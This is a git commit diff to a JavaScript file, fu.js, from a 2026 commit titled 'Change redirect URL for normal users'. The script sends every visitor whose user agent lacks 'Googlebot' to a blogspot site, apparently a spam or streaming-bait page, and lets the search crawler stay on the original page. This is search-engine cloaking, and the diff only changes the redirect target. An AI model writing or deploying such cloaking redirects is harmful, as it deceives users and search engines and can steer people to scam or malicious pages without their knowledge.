22155489c2409b11b1ae034d05e45447f1ce44aa
channeltoday <o.nlinechanneltoday@gmail.com>
2026-08-26 04:31:16 +0600

    Change redirect URL for normal users

--- fu.js
+++ fu.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://watch-now18puls.blogspot.com/2026/08/blog-post_250.html";
+  window.location.href = "https://watch-now18puls.blogspot.com/";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
